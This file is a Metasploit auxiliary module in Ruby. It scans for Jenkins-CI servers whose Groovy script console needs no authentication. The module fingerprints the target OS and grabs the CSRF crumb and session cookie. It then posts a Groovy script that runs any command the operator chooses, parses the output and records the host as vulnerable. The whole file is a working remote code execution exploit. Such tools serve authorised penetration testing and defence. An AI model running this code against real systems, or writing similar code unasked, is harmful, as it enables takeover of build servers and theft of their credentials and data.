##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'cgi'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Jenkins-CI Unauthenticated Script-Console Scanner',
      'Description' => %q{
        This module scans for unauthenticated Jenkins-CI script consoles and
        executes the specified command.
      },
      'Author'      =>
        [
          'altonjx',
          'Jeffrey Cap'
        ],
      'References'  =>
        [
          ['CVE', '2015-8103'], # see link and validate, https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/ states this is another issue
          ['URL', 'https://jenkins.io/security/advisory/2015-11-11/'],
          ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/'],
          ['URL', 'https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console'],
        ],
      'License'     => MSF_LICENSE
      ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The path to the Jenkins-CI application', '/jenkins/' ]),
        OptString.new('COMMAND', [ true, 'Command to run in application', 'whoami' ]),
      ])
  end

  def fingerprint_os(ip)
    res = send_request_cgi({'uri' => normalize_uri(target_uri.path,"systemInfo")})

    # Verify that we received a proper systemInfo response
    unless res && res.body.to_s.length > 0
      vprint_error("#{peer} - The server did not reply to our systemInfo request")
      return
    end

    unless res.body.index("System Properties") &&
           res.body.index("Environment Variables")
      if res.body.index('Remember me on this computer')
        vprint_error("#{peer} This Jenkins-CI system requires authentication")
      else
        vprint_error("#{peer} This system is not running Jenkins-CI at #{datastore['TARGETURI']}")
      end
      return
    end

    host_info = {}
    if (res.body =~ /"\.crumb", "([a-z0-9]*)"/)
      print_status("#{peer} Using CSRF token: '#{$1}'")
      host_info[:crumb] = $1

      sessionid = 'JSESSIONID' << res.get_cookies.split('JSESSIONID')[1].split('; ')[0]
      host_info[:cookie] = "#{sessionid}"
    end

    os_info = pattern_extract(/os.name(.*?)os.version/m, res.body).first
    host_info[:prefix] = os_info.index(">Windows") ? "cmd.exe /c " : ""
    host_info
  end

  def run_host(ip)
    command = datastore['COMMAND'].gsub("\\", "\\\\\\")

    host_info = fingerprint_os(ip)
    return if host_info.nil?
    prefix = host_info[:prefix]

    request_parameters = {
      'uri'       => normalize_uri(target_uri.path,"script"),
      'method'    => 'POST',
      'ctype'     => 'application/x-www-form-urlencoded',
      'vars_post' =>
        {
          'script' => "def sout = new StringBuffer(), serr = new StringBuffer()\r\ndef proc = '#{prefix} #{command}'.execute()\r\nproc.consumeProcessOutput(sout, serr)\r\nproc.waitForOrKill(1000)\r\nprintln \"out> $sout err> $serr\"\r\n",
          'Submit' => 'Run'
        }
    }
    request_parameters['cookie'] = host_info[:cookie] unless host_info[:cookie].nil?
    request_parameters['vars_post']['.crumb'] = host_info[:crumb] unless host_info[:crumb].nil?
    res = send_request_cgi(request_parameters)

    unless res && res.body.to_s.length > 0
      vprint_error("#{peer} No response received from the server.")
      return
    end

    plugin_output, command_output = pattern_extract(/<pre>(.*?)<\/pre>/m, res.body.to_s)

    if plugin_output !~ /Jenkins\.instance\.pluginManager\.plugins/
      vprint_error("#{peer} The server returned an invalid response.")
      return
    end

    # The output is double-HTML encoded
    output = CGI.unescapeHTML(CGI.unescapeHTML(command_output.to_s)).
             gsub(/\s*(out|err)>\s*/m, '').
             strip

    if output =~ /^java\.[a-zA-Z\.]+\:\s*([^\n]+)\n/
      output = $1
      print_good("#{peer} The server is vulnerable, but the command failed: #{output}")
    else
      output.split("\n").each do |line|
        print_good("#{peer} #{line.strip}")
      end
    end

    report_vulnerable(output)

  end

  def pattern_extract(pattern, buffer)
    buffer.to_s.scan(pattern).map{ |m| m.first }
  end

  def report_vulnerable(result)
    report_vuln(
      :host   => rhost,
      :port   => rport,
      :proto  => 'tcp',
      :sname  => ssl ? 'https' : 'http',
      :name   => self.name,
      :info   => result,
      :refs   => self.references,
      :exploited_at => Time.now.utc
    )
  end
end
